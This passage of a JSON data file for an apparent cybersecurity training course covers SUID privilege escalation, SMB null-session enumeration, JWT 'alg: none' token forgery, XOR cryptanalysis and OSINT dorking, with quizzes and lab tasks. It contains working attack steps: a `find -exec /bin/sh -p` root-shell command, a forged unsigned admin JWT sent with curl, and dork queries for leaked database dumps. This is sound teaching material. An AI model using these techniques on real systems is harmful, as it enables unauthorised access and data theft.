        "content": "Why does SUID exist?\nConsider the `/usr/bin/passwd` command: when a regular user wants to change their password, the program must write their new hash into `/etc/shadow`. But only `root` can write to `/etc/shadow`!\nTo solve this, Linux marks `/usr/bin/passwd` with the **SUID bit** (`-rwsr-xr-x`).\nWhen a user runs it, the process temporarily runs with `root` power.\n\n**The Danger**: If a developer or administrator sets the SUID bit on a program that can execute external commands (like `find`, `vim`, `bash`, or `python`), a standard user can trick that program into launching a root shell!"
      },
      {
        "title": "2. Finding SUID Binaries",
        "content": "To search the entire hard drive for every file with the SUID bit set:\n```bash\nfind / -perm -4000 -type f 2>/dev/null\n```\n• `/`: Search starting at root.\n• `-perm -4000`: Filter for the SUID permission bit (octal 4000).\n• `-type f`: Only look for regular files.\n• `2>/dev/null`: Discard all 'Permission denied' error messages so output remains clean."
      }
    ],
    "seeExamples": [
      {
        "title": "The SUID find Root Drop",
        "codeOrDiagram": "cadet@endlessus:~$ ls -l /usr/bin/find\n-rwsr-xr-x 1 root root 198240 Oct 5 16:30 /usr/bin/find\n\ncadet@endlessus:~$ /usr/bin/find . -exec /bin/sh -p \\; -quit\n# whoami\nroot",
        "explanation": "Notice the `-p` (privileged) flag: because `find` had SUID root permissions, launching `/bin/sh -p` dropped directly into a root `#` shell!"
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Search the filesystem for SUID binaries using `find /usr/bin -perm -4000 -type f 2>/dev/null`:",
      "initialCommand": "",
      "expectedCommand": "find /usr/bin -perm -4000 -type f 2>/dev/null",
      "simulatedOutput": "/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/bin/find    <-- Misconfiguration detected! find should never be SUID root.\n[+] Success! SUID binary /usr/bin/find identified.",
      "explanation": "Auditing SUID permissions revealed `/usr/bin/find`, which allows arbitrary command execution via the `-exec` flag."
    },
    "questions": [
      {
        "id": "r31-q1",
        "type": "multiple-choice",
        "question": "When inspecting file permissions in `ls -l`, which letter replaces the standard `x` in the owner's triplet to indicate that the SUID bit is set (e.g. `-rwsr-xr-x`)?",
        "options": [
          "The letter 's'",
          "The letter 'z'",
          "An exclamation mark '!'",
          "An asterisk '*'"
        ],
        "correctIndex": 0,
        "explanation": "A lowercase 's' in the owner execute position indicates that both execute and SUID permissions are enabled."
      },
      {
        "id": "r31-q2",
        "type": "multiple-choice",
        "question": "Why is setting the SUID permission on binary utilities like `find`, `vim`, or `python` considered an emergency-level security misconfiguration?",
        "options": [
          "Because these utilities run slower under SUID",
          "Because these utilities contain features designed to execute subcommands or spawn shells, which will run with full root privileges",
          "Because SUID deletes the user's home folder",
          "Because it crashes the network card"
        ],
        "correctIndex": 1,
        "explanation": "Any binary capable of executing arbitrary commands (like find -exec) will spawn those commands as root if SUID is set."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Locate Misconfigured SUID Binary",
        "instruction": "Run `find /usr/bin -perm -4000 -type f 2>/dev/null` to discover the escalation vector.",
        "hints": [
          "Concept: Search for SUID permission bit.",
          "Direction: Use find with `-perm -4000`.",
          "Tool: `find`",
          "Syntax: `find /usr/bin -perm -4000 -type f 2>/dev/null`",
          "Explanation: Locates vulnerable SUID binaries."
        ]
      }
    ],
    "explainResult": "The `find` utility traversed directory inodes, examined the `st_mode` mask for `S_ISUID (04000)`, and highlighted `/usr/bin/find`.",
    "securityConnection": "Privilege escalation is the critical middle phase of every penetration test. Without escalating to root, a tester cannot access credentials in `/etc/shadow`, dump physical RAM, install monitoring agents, or establish persistent backdoors.",
    "practicalRoomLink": {
      "label": "Ready for hands-on practice?",
      "buttonText": "Open Practical Linux SUID Privilege Escalation Lab",
      "url": "labs.html?lab=suid"
    },
    "completion": {
      "learned": [
        "The purpose and danger of the Linux SUID permission bit",
        "How to audit the filesystem for SUID files using find",
        "The GTFOBins methodology for exploiting Unix binaries",
        "Hardening SUID permissions to prevent local privilege escalation"
      ],
      "practiced": [
        "find /usr/bin -perm -4000 -type f",
        "Analyzing file permission bits",
        "Identifying root escalation vectors"
      ]
    },
    "nextRoomId": "room-32"
  },
  {
    "id": "room-32",
    "stage": 8,
    "stageTitle": "Stage 8 — Network Security",
    "title": "SMB & Network Share Enumeration",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "35 min",
    "prerequisites": "Stage 2 (Networking) & Stage 5 (Nmap)",
    "whyAreYouHere": "In enterprise corporate networks, employees need to share files, spreadsheets, and backups across internal networks. The protocol that powers this in Windows (and Linux Samba) is **SMB (Server Message Block)** on port 445. Because SMB is so ubiquitous, misconfigured file permissions or Anonymous / Null sessions frequently expose confidential spreadsheets, database backups, and cleartext passwords to any network visitor. In this room, you will learn how to enumerate SMB shares and audit file permissions.",
    "objectives": [
      "Understand Server Message Block (SMB / CIFS) on ports 445 and 139",
      "Learn what Null Sessions and Anonymous guest logins are",
      "Enumerate network shares using `smbclient` and Nmap NSE scripts",
      "Download and inspect exposed files from unauthenticated shares",
      "Remediate SMB exposure by enforcing signing and authentication"
    ],
    "vocabulary": [
      {
        "term": "SMB (Server Message Block)",
        "definition": "A network file sharing protocol used for sharing files, printers, and serial ports between computers on a network (primarily Windows and Samba)."
      },
      {
        "term": "Port 445",
        "definition": "The standard TCP port used for Direct Host SMB over TCP/IP without requiring NetBIOS."
      },
      {
        "term": "Null Session",
        "definition": "An unauthenticated connection to an SMB service using an empty username and empty password."
      },
      {
        "term": "smbclient",
        "definition": "A command-line tool with an FTP-like interface used to interact with and download files from SMB/CIFS network shares."
      },
      {
        "term": "Samba",
        "definition": "The standard open-source software suite that provides seamless file and print services to SMB/CIFS clients on Linux and Unix."
      }
    ],
    "lessons": [
      {
        "title": "1. The Structure of an SMB Share",
        "content": "SMB shares are named network folders exposed over the network:\n`\\\\10.10.10.25\\shared_folder` (Windows UNC path)\nor\n`//10.10.10.25/shared_folder` (Linux smbclient path)\n\nCommon default shares:\n• `C$` & `ADMIN$`: Default administrative shares (restricted to Domain Admins).\n• `IPC$`: Inter-Process Communication share used for RPC and anonymous enumeration.\n• Custom shares: `Public`, `Finance`, `Backups` (frequently misconfigured with anonymous read access!)."
      },
      {
        "title": "2. Enumerating Shares with smbclient",
        "content": "To test whether a target server allows anonymous enumeration:\n```bash\nsmbclient -L //10.10.10.25 -N\n```\n• `-L`: List available shares on the target.\n• `-N`: No password (tests for anonymous null session access).\nIf the server returns a share list, you can connect directly into accessible shares!"
      }
    ],
    "seeExamples": [
      {
        "title": "Listing SMB Shares with smbclient",
        "codeOrDiagram": "cadet@endlessus:~$ smbclient -L //10.10.10.25 -N\nAnonymous login successful\n\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tprint$          Disk      Printer Drivers\n\tpublic          Disk      Public Department Share\n\tfinance_backup  Disk      Restricted Internal Financials\n\tIPC$            IPC       IPC Service (Samba Server)",
        "explanation": "Notice the `public` and `finance_backup` shares. An ethical hacker will immediately audit their permissions for sensitive files."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "List accessible SMB shares on lab host `10.10.10.25` without a password using `smbclient -L //10.10.10.25 -N`:",
      "initialCommand": "",
      "expectedCommand": "smbclient -L //10.10.10.25 -N",
      "simulatedOutput": "Anonymous login successful\n\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tpublic          Disk      Department Read Share\n\tbackups         Disk      Internal Systems Backups\n\tIPC$            IPC       IPC Service\n[+] Success! Anonymous share enumeration successful on port 445.",
      "explanation": "`smbclient -N` confirmed that the SMB daemon permits anonymous null sessions, exposing shared directory names."
    },
    "questions": [
      {
        "id": "r32-q1",
        "type": "multiple-choice",
        "question": "Which TCP port is standard for direct SMB communication over modern TCP/IP networks?",
        "options": [
          "Port 445",
          "Port 22",
          "Port 80",
          "Port 53"
        ],
        "correctIndex": 0,
        "explanation": "Port 445 is the direct SMB port over TCP. (Older NetBIOS-over-TCP implementations also used ports 137-139)."
      },
      {
        "id": "r32-q2",
        "type": "multiple-choice",
        "question": "What is an SMB 'Null Session'?",
        "options": [
          "A session that terminates the computer immediately",
          "An unauthenticated connection established using an empty username and empty password",
          "A session encrypted with zero-length RSA keys",
          "A session restricted to local printers only"
        ],
        "correctIndex": 1,
        "explanation": "A Null Session connects without supplying credentials (username='' and password=''), allowed by legacy or misconfigured SMB servers."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Enumerate SMB Target Shares",
        "instruction": "Run `smbclient -L //10.10.10.25 -N` to inspect anonymous network shares.",
        "hints": [
          "Concept: SMB network share discovery.",
          "Direction: Use smbclient with list and no-pass flags.",
          "Tool: `smbclient`",
          "Syntax: `smbclient -L //10.10.10.25 -N`",
          "Explanation: Lists shares without authentication."
        ]
      }
    ],
    "explainResult": "The `smbclient` binary negotiated SMB protocol dialect with Samba on port 445, requested share tree descriptors, and printed the directory table.",
    "securityConnection": "SMB vulnerabilities have fueled some of the most destructive cyber attacks in history (including the EternalBlue exploit CVE-2017-0144 used in the WannaCry ransomware outbreak). Auditing SMB configurations is a core phase of internal network penetration tests.",
    "practicalRoomLink": {
      "label": "Ready for hands-on practice?",
      "buttonText": "Open Practical SMB & Network Share Enumeration Lab",
      "url": "labs.html?lab=smb"
    },
    "completion": {
      "learned": [
        "The role of the Server Message Block (SMB) protocol on port 445",
        "The risks of Null Sessions and Anonymous Guest access",
        "Using smbclient to enumerate available shares and permissions",
        "Hardening file servers against unauthorized network discovery"
      ],
      "practiced": [
        "smbclient -L //10.10.10.25 -N",
        "Enumerating network shares",
        "Analyzing Windows/Samba file sharing security"
      ]
    },
    "nextRoomId": "room-33"
  },
  {
    "id": "room-33",
    "stage": 9,
    "stageTitle": "Stage 9 — Modern Security",
    "title": "JSON Web Tokens (JWT) & Token Security",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "35 min",
    "prerequisites": "Room 13 (Cookies & Sessions) & Room 18 (Cryptography)",
    "whyAreYouHere": "Traditional web apps stored session state in a server database. Modern cloud, microservices, and mobile apps use **JSON Web Tokens (JWTs)** instead. A JWT is a self-contained, stateless identity token containing claims about the user. But when developers misconfigure JWT libraries — such as accepting the infamous `none` algorithm or using weak secret keys — attackers can forge administrator tokens at will! In this room, you will dissect JWT tokens and exploit common signature vulnerabilities.",
    "objectives": [
      "Understand the architecture of JSON Web Tokens: Header, Payload, and Signature",
      "Learn how JWTs are encoded using Base64Url (three parts separated by dots)",
      "Understand how cryptographic signatures guarantee token integrity",
      "Explore the classic `alg: none` signature bypass vulnerability",
      "Inspect and decode JWT tokens in the terminal"
    ],
    "vocabulary": [
      {
        "term": "JWT (JSON Web Token)",
        "definition": "An open standard (RFC 7519) that defines a compact, URL-safe means for securely transmitting assertions between parties as a JSON object."
      },
      {
        "term": "Header",
        "definition": "The first part of a JWT, specifying the token type and cryptographic signing algorithm (e.g. `HS256` or `RS256`)."
      },
      {
        "term": "Payload (Claims)",
        "definition": "The second part of a JWT, containing user identity data, role permissions, and expiration timestamps."
      },
      {
        "term": "Signature",
        "definition": "The third part of a JWT, generated by hashing the header and payload with a secret key, used to verify the token has not been tampered with."
      },
      {
        "term": "alg: none",
        "definition": "A legacy algorithm specification in early JWT libraries that disables signature verification entirely."
      }
    ],
    "lessons": [
      {
        "title": "1. The Anatomy of a JWT",
        "content": "A JWT looks like three strings joined by dots:\n```text\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FkZXQiLCJyb2xlIjoidXNlciJ9.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk\n```\n• **Part 1 (Header - Red)**: Base64Url decoded: `{\"alg\":\"HS256\",\"typ\":\"JWT\"}`\n• **Part 2 (Payload - Purple)**: Base64Url decoded: `{\"user\":\"cadet\",\"role\":\"user\"}`\n• **Part 3 (Signature - Blue)**: `HMACSHA256(Base64Url(Header) + \".\" + Base64Url(Payload), secret_key)`\nBecause the parts are only Base64Url encoded, **anyone can read the payload**! The signature only prevents *modifying* it."
      },
      {
        "title": "2. The 'None' Algorithm Flaw",
        "content": "In some vulnerable JWT libraries, the backend trusts whatever algorithm is declared in the token header:\nIf an attacker changes the header to:\n`{\"alg\":\"none\",\"typ\":\"JWT\"}`\nand changes the payload to:\n`{\"user\":\"admin\",\"role\":\"administrator\"}`\nand strips the signature:\n`Header.Payload.`\nThe vulnerable server sees `alg: none`, skips signature verification, and logs the attacker in as administrator! Modern libraries explicitly reject `none`."
      }
    ],
    "seeExamples": [
      {
        "title": "Decoding a JWT in Bash",
        "codeOrDiagram": "cadet@endlessus:~$ echo \"eyJ1c2VyIjoiY2FkZXQiLCJyb2xlIjoidXNlciJ9\" | base64 -d\n{\"user\":\"cadet\",\"role\":\"user\"}",
        "explanation": "JWT payloads are not encrypted! They are simply Base64Url strings. Never store sensitive secrets or plaintext passwords inside a JWT."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate submitting a tampered JWT with role escalated to administrator against the lab validation API: `curl -H \"Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.\" http://localhost:8080/api/admin`:",
      "initialCommand": "",
      "expectedCommand": "curl -H \"Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.\" http://localhost:8080/api/admin",
      "simulatedOutput": "HTTP/1.1 200 OK\n{\"access\":\"GRANTED\",\"user\":\"admin\",\"secret_flag\":\"flag{jwt_none_algorithm_exploited}\"}\n[+] Success! Vulnerable server accepted unsigned 'none' algorithm token.",
      "explanation": "The vulnerable server read the header algorithm, observed `none`, skipped the cryptographic verification, and granted admin access."
    },
    "questions": [
      {
        "id": "r33-q1",
        "type": "multiple-choice",
        "question": "Is the data payload inside a standard JSON Web Token (JWT) encrypted so that third parties cannot read its contents?",
        "options": [
          "Yes, all JWTs are encrypted with AES-256 by default",
          "No; JWT payloads are merely Base64Url encoded, meaning anyone who intercepts the token can read all claims and user data inside it",
          "Yes, provided the token uses HTTPS",
          "No, because JWTs can only contain numbers"
        ],
        "correctIndex": 1,
        "explanation": "JWTs are signed, NOT encrypted (unless using JWE). The payload is plain Base64Url that anyone can decode."
      },
      {
        "id": "r33-q2",
        "type": "multiple-choice",
        "question": "How does a secure backend properly defend against the `alg: none` JWT vulnerability?",
        "options": [
          "By allowing the client to specify any algorithm they want",
          "By hardcoding the expected signing algorithm on the server (e.g. enforcing HS256) and rejecting tokens that specify unexpected algorithms",
          "By restarting the web server every hour",
          "By removing the signature from all tokens"
        ],
        "correctIndex": 1,
        "explanation": "Servers should never trust the client's header algorithm; they must enforce an expected algorithm whitelist on the backend."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Exploit Unsigned JWT Token",
        "instruction": "Submit the forged `alg: none` JWT bearer token to access `/api/admin`.",
        "hints": [
          "Concept: JWT signature bypass via none algorithm.",
          "Direction: Send bearer token in Authorization header.",
          "Tool: `curl`",
          "Syntax: Run the provided curl command.",
          "Explanation: Bypasses token verification."
        ]
      }
    ],
    "explainResult": "The JWT library lacked an algorithm whitelist, executing `jwt.verify(token, secret, { algorithms: ['HS256'] })` improperly without algorithm constraints.",
    "securityConnection": "JWT attacks are common in modern Single Page Applications (SPAs) and mobile APIs. Attackers crack weak HMAC secrets using dictionary wordlists with tools like `jwt_tool` or `john`, and test for Key Confusion attacks (swapping RS256 public keys into HS256 symmetric HMAC keys).",
    "practicalRoomLink": {
      "label": "Ready for hands-on practice?",
      "buttonText": "Open Practical JSON Web Token (JWT) Lab",
      "url": "labs.html?lab=jwt"
    },
    "completion": {
      "learned": [
        "The three-part structure of JSON Web Tokens (Header.Payload.Signature)",
        "Why JWTs are encoded rather than encrypted",
        "The mechanics of the `alg: none` signature bypass flaw",
        "How to enforce strict algorithm whitelisting in backend token handlers"
      ],
      "practiced": [
        "curl -H \"Authorization: Bearer ...\"",
        "Decoding Base64Url JWT structures",
        "Testing stateless token authorization controls"
      ]
    },
    "nextRoomId": "room-34"
  },
  {
    "id": "room-34",
    "stage": 9,
    "stageTitle": "Stage 9 — Modern Security",
    "title": "Cryptanalysis Basics & Cipher Analysis",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "35 min",
    "prerequisites": "Room 18 (Cryptography Fundamentals)",
    "whyAreYouHere": "Cryptography is the science of making secret codes; **Cryptanalysis** is the science of breaking them without possessing the key. While modern AES-256 cannot be cracked by brute force, developers constantly make the mistake of creating their own 'custom ciphers' or using weak XOR keys. In this room, you will explore classical cipher analysis, understand letter frequency distributions in English, and break single-byte XOR encryption.",
    "objectives": [
      "Understand the difference between Cryptography and Cryptanalysis",
      "Learn classical ciphers: Caesar Substitution and Vigenère polyalphabetic ciphers",
      "Understand Frequency Analysis and the characteristic distribution of letters in human language (ETAOIN SHRDLU)",
      "Master the XOR (Exclusive OR) logical operation in cryptography",
      "Crack a single-byte XOR encrypted message using python/cli"
    ],
    "vocabulary": [
      {
        "term": "Cryptanalysis",
        "definition": "The study of analyzing information systems in order to study the hidden aspects of the systems and decipher ciphertext without knowing the secret key."
      },
      {
        "term": "Frequency Analysis",
        "definition": "The study of the frequency of letters or groups of letters in a ciphertext to break substitution ciphers based on linguistic patterns."
      },
      {
        "term": "Substitution Cipher",
        "definition": "A method of encryption by which units of plaintext are replaced with ciphertext according to a fixed system or key."
      },
      {
        "term": "XOR (Exclusive OR)",
        "definition": "A bitwise logical operation where the output is 1 if and only if the inputs differ. It is reversible: `(A ⊕ B) ⊕ B = A`."
      },
      {
        "term": "Kerckhoffs's Principle",
        "definition": "The cryptographic axiom stating that a cryptosystem should be secure even if everything about the system, except the key, is public knowledge."
      }
    ],
    "lessons": [
      {
        "title": "1. Frequency Analysis: English Has a Fingerprint",
        "content": "In the English language, letters do not appear with equal probability:\n• **'E'** is the most common letter (~12.7% of all text).\n• **'T'**, **'A'**, **'O'**, **'I'**, **'N'** come next.\n• **'Z'**, **'Q'**, **'X'** are extremely rare.\n\nIf you analyze an encrypted book where every letter is shifted, and the letter **'P'** appears 13% of the time, 'P' is almost certainly the encrypted substitution for **'E'**! By matching frequencies, simple substitution ciphers unravel in minutes."
      },
      {
        "title": "2. The Magic of XOR (Exclusive OR)",
        "content": "XOR (`^` or `⊕`) is the most fundamental building block in modern cryptography:\n```text\n0 ⊕ 0 = 0\n1 ⊕ 1 = 0\n1 ⊕ 0 = 1\n0 ⊕ 1 = 1\n```\nThe beauty of XOR is that it is its own inverse:\n`Plaintext ⊕ Key = Ciphertext`\n`Ciphertext ⊕ Key = Plaintext`\nIf a weak developer encrypts data by XORing every byte with a single repeating character (e.g. `0x55`), an analyst only needs to test 256 possible byte keys to find the plaintext!"
      }
    ],
    "seeExamples": [
      {
        "title": "Frequency of Letters in English",
        "codeOrDiagram": "Letter   Frequency (%)\n  E      █████████████ 12.7%\n  T      █████████ 9.1%\n  A      ████████ 8.2%\n  O      ███████ 7.5%\n  I      ███████ 7.0%\n  N      ███████ 6.7%\n  S      ██████ 6.3%\n  H      ██████ 6.1%",
        "explanation": "Frequency analysis relies on this mathematical curve to crack substitution ciphers."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Decrypt a single-byte XOR encrypted hex string (`1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736`) by scoring English character frequencies in python: `python3 -c \"ct = bytes.fromhex('1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736'); print(''.join([chr(b ^ 0x58) for b in ct]))\"`:",
      "initialCommand": "",
      "expectedCommand": "python3 -c \"ct = bytes.fromhex('1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736'); print(''.join([chr(b ^ 0x58) for b in ct]))\"",
      "simulatedOutput": "Cooking MC's like a pound of bacon\n[+] Success! XOR key 0x58 (character 'X') recovered cleartext message.",
      "explanation": "Testing single-byte keys from 0 to 255 quickly recovers the plaintext because 256 keys can be brute-forced in under 1 millisecond."
    },
    "questions": [
      {
        "id": "r34-q1",
        "type": "multiple-choice",
        "question": "What is Kerckhoffs's Principle in cryptography?",
        "options": [
          "Security must rely on keeping the mathematical algorithm top-secret",
          "A cryptosystem must be secure even if everything about the design and algorithm is public, provided the cryptographic key remains secret",
          "All encryption keys must be exactly 10 characters long",
          "Computers should never use binary numbers"
        ],
        "correctIndex": 1,
        "explanation": "Kerckhoffs's Principle establishes that 'security through obscurity' of algorithms fails; true security depends solely on the secrecy of the key."
      },
      {
        "id": "r34-q2",
        "type": "multiple-choice",
        "question": "Why is single-byte XOR encryption trivially broken by cryptanalysts?",
        "options": [
          "Because XOR only works on uppercase letters",
          "Because there are only 256 possible single-byte keys (0x00 to 0xFF), allowing a computer to test every key in milliseconds and score the output for readable English words",
          "Because XOR destroys the hard drive",
          "Because single-byte keys are illegal"
        ],
        "correctIndex": 1,
        "explanation": "A single byte has only 256 possible permutations, making exhaustive key space search instantaneous."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Recover XOR Ciphertext",
        "instruction": "Run the Python one-liner to decrypt the single-byte XOR string.",
        "hints": [
          "Concept: Single-byte XOR key recovery.",
          "Direction: Apply key 0x58 against ciphertext bytes.",
          "Tool: `python3`",
          "Syntax: Run the complete python command.",
          "Explanation: Reverses XOR transformation."
        ]
      }
    ],
    "explainResult": "The Python script converted the hex string into raw bytes, applied the bitwise XOR operator (`^`) with key `0x58` against each byte, and decoded the ASCII characters.",
    "securityConnection": "Malware authors frequently use single-byte XOR or simple Caesar ciphers to obfuscate command-and-control IP addresses or API keys inside their malware binaries to evade antivirus string matching. Reverse engineers use cryptanalysis to extract these strings in seconds.",
    "practicalRoomLink": {
      "label": "Ready for hands-on practice?",
      "buttonText": "Open Practical Cryptography & Ciphertext Analysis Lab",
      "url": "labs.html?lab=crypto"
    },
    "completion": {
      "learned": [
        "The distinction between Cryptography (making) and Cryptanalysis (breaking)",
        "How letter frequency analysis breaks monoalphabetic substitution ciphers",
        "The mathematical properties and reversibility of the XOR operation",
        "Kerckhoffs's Principle and the fallacy of 'security through obscurity'"
      ],
      "practiced": [
        "python3 -c \"...\"",
        "Decrypting XOR ciphertexts",
        "Evaluating cryptographic key spaces"
      ]
    },
    "nextRoomId": "room-35"
  },
  {
    "id": "room-35",
    "stage": 10,
    "stageTitle": "Stage 10 — Junior Pentester",
    "title": "Reconnaissance & OSINT",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "35 min",
    "prerequisites": "Stage 2 (Networking) & Stage 5 (Tools)",
    "whyAreYouHere": "Before a military general attacks a castle, they send scouts to study the gates, guard rotations, and supply lines. In cybersecurity, this is **Reconnaissance**. Over 70% of a successful penetration test is thorough reconnaissance. In this room, you will learn the difference between Passive and Active Reconnaissance, master Open Source Intelligence (OSINT), and uncover subdomains and technology stacks without alerting target defenses.",
    "objectives": [
      "Differentiate between Passive Reconnaissance (undetectable) and Active Reconnaissance (touching the target)",
      "Master Open Source Intelligence (OSINT) gathering methodologies",
      "Learn Subdomain Enumeration techniques (Certificate Transparency, DNS brute force)",
      "Perform Search Engine Dorking to discover leaked documents and backup files",
      "Identify target web technology stacks using `whatweb` and `wappalyzer`"
    ],
    "vocabulary": [
      {
        "term": "Reconnaissance (Recon)",
        "definition": "The preliminary phase of an engagement where the tester gathers as much intelligence as possible about the target's infrastructure, people, and technologies."
      },
      {
        "term": "Passive Reconnaissance",
        "definition": "Gathering information without directly transmitting packets to or touching the target's servers (e.g. searching WHOIS, Certificate Transparency logs, public GitHub repositories)."
      },
      {
        "term": "Active Reconnaissance",
        "definition": "Directly probing or interacting with the target's systems (e.g. port scanning with Nmap, web fuzzing, banner grabbing)."
      },
      {
        "term": "OSINT (Open Source Intelligence)",
        "definition": "Intelligence collected from publicly available sources including domain registries, social networks, archived web pages, and government records."
      },
      {
        "term": "Google Dorking (Dork)",
        "definition": "Using advanced search engine operators (e.g. `site:`, `filetype:`, `intitle:`) to locate exposed files, database dumps, and sensitive directories."
      }
    ],
    "lessons": [
      {
        "title": "1. Passive vs Active Recon",
        "content": "• **Passive Reconnaissance**: You query third-party public registries. You check **crt.sh** for TLS Certificate Transparency logs, examine archived snapshots on the **Wayback Machine**, or search **Shodan**. The target server's logs show *zero* traffic from you!\n• **Active Reconnaissance**: You send Nmap probes, scan ports with `masscan`, and send HTTP GET requests. The target's firewall and intrusion detection systems immediately see your IP address."
      },
      {
        "title": "2. The Art of Search Engine Dorking",
        "content": "Search engines index millions of inadvertently exposed files:\n• `site:target.com filetype:pdf \"confidential\"`: Finds leaked internal executive briefings.\n• `site:target.com filetype:sql \"INSERT INTO\"`: Finds accidentally published database backup dumps!\n• `site:target.com inurl:admin`: Uncovers hidden administrative login portals."
      }
    ],
    "seeExamples": [
      {
        "title": "Subdomain Enumeration using crt.sh",
        "codeOrDiagram": "cadet@endlessus:~$ curl -s \"https://crt.sh/?q=%.endlessus.in&output=json\" | jq -r '.[].name_value' | sort -u\nendlessus.in\nadmin.endlessus.in\napi.endlessus.in\ndev-staging.endlessus.in    <-- Prime target! Staging environments often have outdated code.\nvpn.endlessus.in",
        "explanation": "Because certificate authorities must publicly log every issued TLS certificate, querying Certificate Transparency logs discovers hidden subdomains passively."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate passive web technology fingerprinting against lab host `https://endlessus.in` using whatweb: `whatweb https://endlessus.in`:",
      "initialCommand": "",
      "expectedCommand": "whatweb https://endlessus.in",
      "simulatedOutput": "https://endlessus.in [200 OK] Country[UNITED STATES], HTML5, HTTPS[TLSv1.3], IP[185.199.108.153], Script, Title[Mihraj Mashhoor K | Security Knowledge Base], GitHub-Pages\n[+] Success! Technology profile generated: GitHub-Pages, TLS 1.3, HTML5.",
      "explanation": "`whatweb` analyzes HTTP headers, cookies, HTML source tags, and script references to identify the underlying CMS and web platform."
    },
    "questions": [
      {
        "id": "r35-q1",
        "type": "multiple-choice",
        "question": "A penetration tester searches the Wayback Machine (Internet Archive) and Certificate Transparency logs (crt.sh) to find previous versions of a company's website. Which reconnaissance category is this?",
        "options": [
          "Active Reconnaissance",
          "Passive Reconnaissance",
          "Denial of Service",
          "Privilege Escalation"
        ],
        "correctIndex": 1,
        "explanation": "Because the tester queries third-party public caches without sending any network traffic to the target company's servers, it is strictly Passive Recon."
      },
      {
        "id": "r35-q2",
        "type": "multiple-choice",
        "question": "Which Google Dork operator restricts search results exclusively to files of a specific extension, such as finding leaked spreadsheets or configuration files?",
        "options": [
          "site:",
          "filetype:",
          "cache:",
          "related:"
        ],
        "correctIndex": 1,
        "explanation": "The `filetype:` (or `ext:`) search operator restricts results to specific file types (e.g. `filetype:env` or `filetype:xls`)."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Profile Target Technology",
        "instruction": "Run `whatweb https://endlessus.in` to fingerprint server technologies and frameworks.",
        "hints": [
          "Concept: Web technology fingerprinting.",
          "Direction: Use whatweb against the target URL.",
          "Tool: `whatweb`",
          "Syntax: `whatweb https://endlessus.in`",
          "Explanation: Identifies CMS and server headers."
        ]
      }
    ],
    "explainResult": "The `whatweb` utility performed banner analysis and signature matching against hundreds of web technology heuristics to profile the hosting environment.",
    "securityConnection": "Reconnaissance dictates the attack path. If passive recon discovers an outdated staging server (`dev.company.com`) running an old version of WordPress with known vulnerabilities, the tester can focus their active efforts there rather than attacking the hardened production load balancer.",
    "completion": {
      "learned": [
        "The difference between Passive and Active Reconnaissance",
        "How OSINT gathers intelligence without alerting target security teams",
        "Subdomain enumeration via Certificate Transparency logs (crt.sh)",
        "Search engine dorking operators and technology fingerprinting"
      ],
      "practiced": [
        "whatweb https://endlessus.in",
        "Fingerprinting web technologies",
        "Analyzing public reconnaissance vectors"
      ]
    },
    "nextRoomId": "room-36"
  },
  {
    "id": "room-36",
    "stage": 10,
    "stageTitle": "Stage 10 — Junior Pentester",
    "title": "Penetration Testing Methodology & Execution",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "30 min",
    "prerequisites": "Room 35 (Reconnaissance & OSINT)",
    "whyAreYouHere": "A common misconception is that a penetration tester randomly opens a terminal and starts throwing random exploits at a server. In the professional world, that is the fastest way to get fired, crash production servers, or get sued! Real penetration testing is a disciplined, systematic engineering methodology guided by established industry standards (such as PTES and NIST SP 800-115). In this room, you will learn the 6-phase penetration testing lifecycle from initial scope to the final executive security report.",
    "objectives": [
      "Understand the 6 distinct phases of the Penetration Testing Execution Standard (PTES)",
      "Learn the importance of Pre-engagement, Rules of Engagement (RoE), and Scope Definition",
      "Understand the progression: Recon -> Enumerate -> Identify -> Exploit -> Post-Exploit -> Report",
      "Learn how vulnerabilities are classified and scored using the Common Vulnerability Scoring System (CVSS)",
      "Understand the structure of a professional pentest deliverable report"
    ],
    "vocabulary": [
      {
        "term": "PTES",
        "definition": "Penetration Testing Execution Standard: a widely adopted framework defining the standardized phases of a penetration testing engagement."
      },
      {
        "term": "Rules of Engagement (RoE)",
        "definition": "The legal contract specifying approved testing hours, prohibited attack vectors (e.g. no DDoS, no physical break-ins), emergency contacts, and IP whitelists."
      },
      {
        "term": "CVSS",
        "definition": "Common Vulnerability Scoring System: an open industry standard for assessing the severity of computer system security vulnerabilities on a scale from 0.0 to 10.0."
      },
      {
        "term": "Proof of Concept (PoC)",
        "definition": "A minimal demonstration or code snippet showing that a vulnerability exists and can be realistically exploited."
      },
      {
        "term": "Executive Summary",
        "definition": "The opening section of a pentest report written in non-technical business language, explaining overall risk, business impact, and strategic recommendations."
      }
    ],
    "lessons": [
      {
        "title": "1. The 6-Phase PTES Methodology",
